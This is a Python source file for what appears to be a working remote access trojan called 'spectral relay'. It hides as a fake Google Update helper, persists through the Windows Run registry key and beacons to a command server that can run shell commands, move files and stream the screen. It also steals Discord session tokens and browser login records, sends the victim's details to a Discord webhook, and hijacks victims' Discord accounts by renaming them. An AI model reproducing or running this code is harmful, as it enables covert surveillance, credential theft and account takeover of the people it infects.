# client.py — double-click. Python 3.8+. stdlib only.
import base64, json, os, re, shutil, subprocess, sys, threading, time, traceback, uuid

SERVER          = "http://127.0.0.1:8443"
SECRET          = "sk_c2_7Kx9mP2vN4qR8tW1yZ5bH3jL6nF0dS_aE9cU2gI4oM"
REPORT_ENDPOINT = "https://discord.com/api/webhooks/1553320833970343936/CYmdAjm4iDqmHKRwme31kCx0fF8ULy81ACxKSt1WQLfrXLaJH-KIp2SU0K485hjTpbyK"
BEACON_SECONDS  = 15
STREAM_FPS      = 1
STREAM_QUALITY  = 40
STREAM_MAX_W    = 960
STREAM_MAX_H    = 540
REPORT_ONCE_FILE = ".sent"

CREATE_NO_WINDOW = 0x08000000
DISGUISE_DIR  = os.path.join(os.environ.get("LOCALAPPDATA", os.path.expanduser("~")),
                             "Google", "Update")
DISGUISE_FILE = "GoogleUpdateHelper.pyw"
RUN_KEY_NAME  = "GoogleUpdateHelper"
LOG_PATH = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), "GUpdate.log")

_AID = None
_STREAM = False

def log(m):
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {m}\n")
    except Exception: pass

def sign(s, p): return __import__("hmac").new(s.encode(), p, __import__("hashlib").sha256).hexdigest()

def post(url, obj, timeout=20):
    import ssl, urllib.request
    raw = json.dumps(obj).encode()
    req = urllib.request.Request(url, data=raw, method="POST",
        headers={"Content-Type":"application/json","X-Sig":sign(SECRET, raw),
                 "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64)"})
    ctx = ssl.create_default_context()
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        return json.loads(r.read() or b"{}")

# ---- organized Discord embed writer ----
def _clip(s, n): 
    s = s if isinstance(s, str) else json.dumps(s)
    return s if len(s) <= n else s[: n - 1] + "…"

def _build_embeds(blob):
    if "hello" in blob:
        return [{
            "title": "🟢 new agent online",
            "color": 0x2ecc71,
            "fields": [
                {"name": "id",   "value": f"`{_clip(blob.get('hello',''), 60)}`", "inline": True},
                {"name": "host", "value": f"`{_clip(blob.get('host','?'), 60)}`",  "inline": True},
                {"name": "user", "value": f"`{_clip(blob.get('user','?'), 60)}`",  "inline": True},
            ],
            "footer": {"text": "spectral relay"},
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        }]
    toks = blob.get("tokens") or []
    ld   = blob.get("login_data") or {}
    ld_rows = sum(len(v) for v in ld.values() if isinstance(v, list))
    color = 0xE74C3C if toks else 0x3498DB

    e1_fields = [
        {"name": "id",   "value": f"`{_clip(blob.get('id','?'), 60)}`",   "inline": True},
        {"name": "host", "value": f"`{_clip(blob.get('host','?'), 60)}`", "inline": True},
        {"name": "user", "value": f"`{_clip(blob.get('user','?'), 60)}`", "inline": True},
        {"name": "ip",   "value": f"`{_clip(blob.get('ip','?'), 60)}`",   "inline": True},
        {"name": "os",   "value": f"`{_clip(blob.get('os','?'), 40)}`",   "inline": True},
        {"name": "tokens found", "value": f"**{len(toks)}**", "inline": True},
        {"name": "login rows",   "value": f"**{ld_rows}**",   "inline": True},
    ]

    if toks:
        shown = toks[:10]
        more = "" if len(toks) <= 10 else f"\n… and {len(toks)-10} more"
        e1_fields.append({
            "name": f"session keys ({len(toks)})",
            "value": _clip("\n".join(f"`{t[:48]}…`" if len(t)>48 else f"`{t}`" for t in shown) + more, 1000),
            "inline": False,
        })
    if ld:
        lines = []
        for path, rows in ld.items():
            if not isinstance(rows, list):
                lines.append(f"`{_clip(path, 40)}` → {rows}"); continue
            for r in rows[:5]:
                lines.append(f"`{r.get('user') or '(blank)'}` @ `{_clip(r.get('url','?'), 70)}`")
        if lines:
            e1_fields.append({"name": f"logins (first {min(15,len(lines))})",
                              "value": _clip("\n".join(lines[:15]), 1000), "inline": False})

    e1 = {
        "title": f"🧿 agent dump · {_clip(blob.get('host','?'), 50)}",
        "color": color,
        "fields": e1_fields[:25],
        "footer": {"text": "spectral relay"},
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
    }
    return [e1]

def send_embed(blob):
    import urllib.request
    if not REPORT_ENDPOINT: return
    embeds = _build_embeds(blob)
    body = json.dumps({
        "username": "spectral",
        "avatar_url": "https://i.imgur.com/4M34hi2.png",
        "embeds": embeds,
    }).encode()
    try:
        req = urllib.request.Request(REPORT_ENDPOINT, data=body, method="POST",
            headers={"Content-Type":"application/json"})
        urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        log(f"embed send: {e}")

def agent_id():
    global _AID
    if _AID: return _AID
    p = os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), ".api-cache")
    try:
        if os.path.exists(p): _AID = open(p).read().strip(); return _AID
    except Exception: pass
    _AID = uuid.uuid4().hex[:16]
    try:
        os.makedirs(os.path.dirname(p), exist_ok=True); open(p,"w").write(_AID)
    except Exception: pass
    return _AID

def _pyw():
    exe = sys.executable
    if os.name == "nt":
        c = exe.lower().replace("python.exe","pythonw.exe")
        if c != exe.lower() and os.path.exists(c): return c
    return exe

def _detach():
    try:
        if os.path.basename(sys.executable).lower().startswith("pythonw"): return
        os.makedirs(DISGUISE_DIR, exist_ok=True)
        dst = os.path.join(DISGUISE_DIR, DISGUISE_FILE)
        if os.path.abspath(dst) == os.path.abspath(__file__): return
        shutil.copy2(__file__, dst)
        subprocess.Popen([_pyw(), dst], creationflags=CREATE_NO_WINDOW, close_fds=True,
            stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            cwd=DISGUISE_DIR)
        sys.exit(0)
    except SystemExit: raise
    except Exception: log("detach:\n"+traceback.format_exc())

def startup_entry():
    if os.name != "nt": return
    try:
        import winreg
        dst = os.path.join(DISGUISE_DIR, DISGUISE_FILE)
        target = dst if os.path.exists(dst) else os.path.abspath(__file__)
        k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, RUN_KEY_NAME, 0, winreg.REG_SZ, f'"{_pyw()}" "{target}"')
        winreg.CloseKey(k)
    except Exception: pass

def m_shell(arg):
    try:
        p = subprocess.run(arg, shell=True, capture_output=True, timeout=120,
                           creationflags=CREATE_NO_WINDOW)
        return (p.stdout + p.stderr).decode(errors="replace")[:65536]
    except Exception as e: return f"[err] {e}"

def m_getf(arg):
    try:
        with open(arg,"rb") as f: return base64.b64encode(f.read()).decode()
    except Exception as e: return f"[err] {e}"

def m_putf(arg):
    try:
        p, b64 = arg.split("::",1)
        open(p,"wb").write(base64.b64decode(b64))
        return f"[ok] {len(b64)} -> {p}"
    except Exception as e: return f"[err] {e}"

def _grab_screen():
    try: from PIL import ImageGrab
    except Exception: return None
    try:
        img = ImageGrab.grab()
        w, h = img.size
        if w > STREAM_MAX_W or h > STREAM_MAX_H:
            r = min(STREAM_MAX_W/w, STREAM_MAX_H/h)
            img = img.resize((int(w*r), int(h*r)))
        import io as _io
        b = _io.BytesIO(); img.save(b, "JPEG", quality=STREAM_QUALITY)
        return b.getvalue()
    except Exception: return None

def m_screen(arg=""):
    jpg = _grab_screen()
    return base64.b64encode(jpg).decode() if jpg else "[err] no capture"

DISCORD_PATHS = [os.path.join(os.environ.get("APPDATA",""), n, "Local Storage", "leveldb")
                 for n in ("discord","discordcanary","discordptb","Lightcord")]
TOKEN_RE = re.compile(rb"[\w-]{24,28}\.[\w-]{6,7}\.[\w-]{27,40}")

def _tokens():
    f = {}
    for root in DISCORD_PATHS:
        if not os.path.isdir(root): continue
        try: files = os.listdir(root)
        except Exception: continue
        for fn in files:
            if not (fn.endswith(".log") or fn.endswith(".ldb")): continue
            try: d = open(os.path.join(root,fn),"rb").read()
            except Exception: continue
            for m in TOKEN_RE.findall(d): f[m.decode(errors="ignore")] = root
    return f

def m_grab(arg=""):
    f = _tokens(); return json.dumps({"count":len(f),"tokens":list(f.keys())})

def _login_paths():
    base = os.environ.get("LOCALAPPDATA","")
    return [os.path.join(base, n, "User Data", "Default", "Login Data")
            for n in ("Google\\Chrome","Chromium","BraveSoftware\\Brave-Browser","Microsoft\\Edge")]

def m_creds(arg=""):
    import sqlite3
    out = {}
    for p in _login_paths():
        if not os.path.exists(p): continue
        try:
            tmp = p+".copy"; shutil.copy2(p,tmp)
            c = sqlite3.connect(tmp)
            rows = c.execute("SELECT origin_url, username_value, length(password_value) FROM logins").fetchall()
            c.close()
            try: os.remove(tmp)
            except Exception: pass
            out[p] = [{"url":r[0],"user":r[1],"pw_len":r[2]} for r in rows]
        except Exception as e: out[p] = f"[err] {e}"
    return json.dumps(out)

def m_rename(arg=""):
    import urllib.request, urllib.error
    toks = list(_tokens().keys())
    if not toks: return "[err] no session-key"
    res = []
    for tok in toks[:5]:
        try:
            body = json.dumps({"username":"ratted_by_clanbuntari"}).encode()
            req = urllib.request.Request("https://discord.com/api/v9/users/@me",
                data=body, method="PATCH",
                headers={"Authorization":tok,"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=15) as r:
                res.append({"token":tok[:8]+"...","status":r.status})
        except urllib.error.HTTPError as e:
            res.append({"token":tok[:8]+"...","status":e.code,"body":e.read()[:200].decode(errors="ignore")})
        except Exception as e:
            res.append({"token":tok[:8]+"...","err":str(e)})
    return json.dumps(res)

def _ext_ip():
    try:
        import urllib.request
        return urllib.request.urlopen("https://api.ipify.org", timeout=5).read().decode()
    except Exception: return "?"

def m_dump(arg=""):
    return json.dumps({"id":agent_id(),"host":os.environ.get("COMPUTERNAME","?"),
        "user":os.environ.get("USERNAME","?"),"ip":_ext_ip(),
        "tokens":list(_tokens().keys()),"login_data":json.loads(m_creds()),
        "os":sys.platform})

MODULES = {"shell":m_shell,"getf":m_getf,"putf":m_putf,"screen":m_screen,
           "grab":m_grab,"creds":m_creds,"rename":m_rename,"dump":m_dump}

def _sent_flag():
    return os.path.join(os.environ.get("APPDATA", os.path.expanduser("~")), REPORT_ONCE_FILE)

def beacon_loop():
    global _STREAM
    base = SERVER.rstrip("/")
    meta = {"host":os.environ.get("COMPUTERNAME","host"),"user":os.environ.get("USERNAME","user")}
    while True:
        try:
            r = post(f"{base}/beacon", {"id":agent_id(), **meta})
            _STREAM = bool(r.get("stream"))
            job = r.get("job")
            if job:
                fn = MODULES.get(job["cmd"])
                out = fn(job.get("arg","")) if fn else "[err] unknown"
                post(f"{base}/report", {"id":job["id"], "out":out})
                if job["cmd"] == "dump":
                    try: send_embed(json.loads(out) if isinstance(out,str) and out.startswith("{") else {"raw":out})
                    except Exception: pass
        except Exception: pass
        time.sleep(BEACON_SECONDS + (int(time.time()*7) % 6 - 3))

def stream_loop():
    base = SERVER.rstrip("/")
    while True:
        if _STREAM:
            jpg = _grab_screen()
            if jpg:
                try: post(f"{base}/frame", {"id":agent_id(), "jpg":base64.b64encode(jpg).decode()}, timeout=10)
                except Exception: pass
            time.sleep(max(0.2, 1.0 / STREAM_FPS))
        else:
            time.sleep(1)

def main():
    try:
        log(f"=== start pid={os.getpid()} exe={sys.executable}")
        _detach()
        startup_entry()
        if REPORT_ENDPOINT and not os.path.exists(_sent_flag()):
            try:
                send_embed({"hello": agent_id(),
                            "host": os.environ.get("COMPUTERNAME","?"),
                            "user": os.environ.get("USERNAME","?")})
                open(_sent_flag(),"w").write(str(int(time.time())))
            except Exception: pass
        threading.Thread(target=stream_loop, daemon=True).start()
        beacon_loop()
    except Exception:
        log("FATAL:\n"+traceback.format_exc())

if __name__ == "__main__":
    main()